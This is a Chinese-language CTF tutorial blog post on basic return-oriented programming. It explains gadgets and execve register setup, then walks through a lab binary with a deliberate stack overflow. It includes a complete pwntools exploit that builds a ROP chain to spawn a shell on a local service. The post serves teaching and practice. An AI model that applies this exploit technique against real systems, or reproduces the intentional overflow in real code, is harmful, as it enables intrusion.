---
title: "Day12－Basic ROP"
date: 2024-09-12
draft: false
tags: ["iron-man-2024", "pwn", "binary-exploitation"]
categories: ["security-research"]
author: "YJK"
showToc: true
TocOpen: false
---


## [Lab 網址](https://github.com/YJK0805/PWN-CTF-note/)

## 前言

昨天的 shellcode 是在記憶體區段有執行與寫入權限的情況下才可以執行，那如果程式啟用了 NX 保護，且沒有任何變數的記憶體區段有執行權限呢？這就要提到今天的內容：ROP (Return Oriented Programming)。

## static or dynamic linking

觀察以下程式碼，並使用底下的編譯參數分別編譯：

```c=
#include<stdio.h>
int main(){
    printf("Hello World!\n");
    return 0;
}
```

```sh=
gcc test.c -static -o static
gcc test.c -o dynamic
```

透過各種資訊查看兩者差異，這裡使用 `ls`、`file` 和 ASM 的方式比較。

`ls -al static dynamic`

可以發現 static 檔案的大小明顯大上許多。

![image](https://hackmd.io/_uploads/Hkq2LDFT0.png)

`file static dynamic` 可以看到一個是 static linking，另一個是 dynamic linking。

![image](https://hackmd.io/_uploads/HJwzPDYaR.png)

static 的 main function

![image](https://hackmd.io/_uploads/rkKZ_DY6C.png)

dynamic 的 main function

![image](https://hackmd.io/_uploads/rkSQOPY6A.png)

可以看到一個是直接呼叫 `puts`，而另一個是呼叫 `puts@plt`。
簡單來說，static linking 的檔案比較大，因為會將所有使用到的外部函式，例如 `scanf`、`printf` 等都編譯進去。而 dynamic linking 則是當程式需要呼叫外部函式時，會從外部的函式庫（如 Windows 的 .dll 或 Linux 的 .so）進行調用。例如，這個程式呼叫的就是 `libc.so`。前面提到的 plt 和 got 也是因此而產生的。

## ROP (Return Oriented Programming)

簡單來說，既然不能寫入並執行 shellcode，那我們可以利用已經編譯好的程式碼片段來填充暫存器，使其達到我們想要的狀態。如果能夠控制程式的執行流程，雖然不能寫入 shellcode，但仍然可以透過已經存在的程式碼片段來執行，從而繞過 NX 保護。這就是 ROP 的基本概念。這些程式碼片段通常被稱為 gadgets，我們需要做的就是利用多個 gadgets 組成 ROP chain，藉此達成我們的目標。

## ROP gadgets

ROP gadgets 是可以執行的程式片段，通常以 `ret` 或 `jmp <address>` 作為結尾，用來方便跳轉至其他指令。這些 gadgets 可以用來控制暫存器、寫入資料，甚至呼叫系統呼叫 (syscall)。可以使用工具如 [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) 或 [ropper](https://github.com/sashs/Ropper) 來尋找這些 gadgets。

ROP gadgets 是片段可以執行的程式，通常結尾會是 ret 或是 jmp \<address>，就是可以方便跳轉到其他指令的地方，那我們通常會用於控制 register 或是寫入資料，又或是 call syscall，那找到這些可以用的 gadgets 的方式就是透過 [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)或是 [ropper](https://github.com/sashs/Ropper)

## How to control register?

假設我們有一個 gadget 是 `pop rax ; ret`並且後面接 `0x3b`， stack 會是以下這樣

![image](https://hackmd.io/_uploads/H1Y7Vjtp0.png)

此時執行 `pop rax` 到 `ret` 就可以成功地將 `rax` 修改為 `0x3b`，並可以繼續執行下一個 gadget。

## How to get shell

現在我們已經知道如何修改暫存器，但該如何開啟 shell 呢？這就涉及到之前提到的 [Linux System Call Table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)，可以看到有個 syscall 是 `execve`，我們可以利用它來開啟 shell。
暫存器的順序是根據 calling convention 決定的。這裡可以參考 [syscall table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)，其中列出了 `rax`、`rdi`、`rsi`、`rdx` 等暫存器的用途。

| syscall name | references | %rax | arg0 (%rdi) | arg1 (%rsi) | arg2 (%rdx) |
| - | - | - | - | - | - |
execve | man/ cs/ | 0x3b | const char \*filename | const char \*const \*argv | const char \*const \*envp |

根據上述說明，我們需要將 `rax` 設置為 `0x3b`，將 `rdi` 設為 `/bin/sh` 的地址，`rsi` 和 `rdx` 則為其他參數，這裡可以設為 `NULL`（即 0）。最後呼叫 `syscall` 即可成功開啟 shell。

## 技巧

可以使用 `ROPgadget --binary <binary> > gadget` 將所有 gadgets 儲存至檔案，接著透過 `cat gadget | grep "pop rdi"` 來查找所需的 gadget 地址。如果找不到單純的 gadget，例如 `pop rax ; ret`，可以使用其他不影響結果的 gadget，例如 `pop rax ; pop rbx ; ret`。

## 常用 gadgets

- `pop <reg> ; ret`
    - 控制 register
- `mov qword ptr [reg], reg ; ret;`
    - 寫入 memory
- `syscall`
    - 呼叫 syscall
    
## Lab
    
查看以下原始碼：

```c=
#include<stdio.h>
int main(){
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    char buf[0x20];
    printf("Give me your message: ");
    read(0, buf, 0x200);
    return 0;
}
```

使用以下指令進行編譯：

```sh=
gcc src/rop.c -o ./rop/share/rop -fno-stack-protector -no-pie -static
```

大家可以自行練習這道題目，或是繼續閱讀以下解題步驟。

## writeup

可以發現程式關閉了 PIE 和 Canary，並且使用了 `-static` 編譯，因此有許多 gadgets 可供使用，因為 `libc` 函數直接被編譯進了程式中。此外，`read` 函數讀入的字串大小是 0x200，但 `buf` 的大小只有 0x20，因此有 `0x200 - 0x20 = 0x1e0` 的 buffer overflow 空間。

我們現在需要解決兩個問題：

- 覆蓋多少才可以覆蓋到 return address？
- 如何串聯 ROP chain？

覆蓋到 return address 的長度可以使用前面提到的 buffer overflow 技巧找到。而 ROP chain 則按照前述技巧來組成。記得要先將 `/bin/sh` 寫入可寫的區段，再將 `rdi` 指向那個地址。可以用 `gdb` 開啟程式，使用 `vmmap` 查找可寫的區域。具體步驟是：`gdb ./rop` 啟動程式，並在 `main` 函數下設置斷點 (`b main`)，然後使用 `vmmap` 查看。

以下這個區塊是可寫的區域：

![image](https://hackmd.io/_uploads/SygmKpYTR.png)

接下來使用 `x/10gx <address>` 查找未被使用的地址，並將字串寫入該位置。

![image](https://hackmd.io/_uploads/SyAtt6KTC.png)

最後將 `rdi` 指向該地址即可。

完整 exploit：

這裡的 address 可以用 `p64()` 包起來，也可以像我一樣使用 `flat()` 將整段串起來。不過使用 `flat()` 時要先設定 `context.arch`。

```py=
from pwn import *

context.arch = 'amd64'

#r = process('../rop/share/rop')
r = remote('127.0.0.1', 10004)
rop = flat(
    0x408e5c, # pop rsi ; ret
    0x49d0c0, # writable address
    0x41732c, # pop rax ; ret
    b'/bin/sh\x00',
    0x418551, # mov qword ptr [rsi], rax ; ret
    0x41732c, # pop rax ; ret
    0x3b, # execve
    0x401ff0, # pop rdi ; ret
    0x49d0c0, # writable address
    0x408e5c, # pop rsi ; ret
    0x0, # NULL
    0x45d9c7, # pop rdx ; pop rbx ; ret
    0x0, # NULL
    0x0, # NULL
    0x4011ef, # syscall
)
payload = b'A' * (0x20 + 8) + rop
r.sendlineafter(b'Give me your message: ', payload)
r.interactive()
```

solve！！

![image](https://hackmd.io/_uploads/By3c9TY6R.png)

## Bonus

有些人或許會覺得 gadgets 要一個一個找會很麻煩，所以這邊介紹一個直接生成 ROP chain 的方式就是直接使用 `ROPgadget --binary <file> --ropchain`，這樣就會生成出可以直接開 shell 的 ROP chain，不過有時候會有很雜亂的 ROP chain，甚至會導致 payload 太長，所以超過可以 buffer overflow 的長度，就像是以下情況

![image](https://hackmd.io/_uploads/B1ok3aYpR.png)
